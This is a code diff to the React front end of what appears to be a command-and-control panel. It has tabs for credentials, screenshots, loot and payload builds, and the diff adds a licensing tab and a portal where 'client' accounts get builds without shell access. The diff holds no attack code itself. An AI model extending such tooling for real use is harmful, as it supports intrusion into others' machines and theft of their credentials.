@@ -10,6 +10,8 @@ import DetailPanel from "./components/DetailPanel";
 import ToastContainer from "./components/Toast";
 import Users from "./components/Users";
 import Build from "./components/Build";
+import Licenses from "./components/Licenses";
+import ClientPortal from "./components/ClientPortal";
 import Creds from "./components/Creds";
 import Screenshots from "./components/Screenshots";
 import Loot from "./components/Loot";
@@ -370,8 +372,9 @@ export default function App() {
       isAdmin
         ? [
             ...BASE_TABS,
-            { id: "BUILD", icon: "⬡", label: "BUILD" },
-            { id: "USERS", icon: "☰", label: "USERS" },
+            { id: "BUILD",    icon: "⬡", label: "BUILD"     },
+            { id: "LICENSES", icon: "⊟", label: "LICENSES"  },
+            { id: "USERS",    icon: "☰", label: "USERS"     },
           ]
         : BASE_TABS,
     [isAdmin],
@@ -674,6 +677,15 @@ export default function App() {
       <>
         <style>{GLOBAL_CSS}</style>
         <Login />
+      </>
+    );
+
+  // Client accounts only see the build portal — no C2 shell access
+  if (jwtPayload.role === "client")
+    return (
+      <>
+        <style>{GLOBAL_CSS}</style>
+        <ClientPortal />
       </>
     );
 
@@ -998,8 +1010,9 @@ export default function App() {
                 ? <Loot key={selectedAgent.agent_id} agentId={selectedAgent.agent_id} />
                 : <NoSel />)}
               {tab === "MAP"   && <NetworkMap />}
-              {tab === "BUILD" && <Build />}
-              {tab === "USERS" && <Users />}
+              {tab === "BUILD"     && <Build />}
+              {tab === "LICENSES" && <Licenses />}
+              {tab === "USERS"    && <Users />}
             </div>
           </main>
 
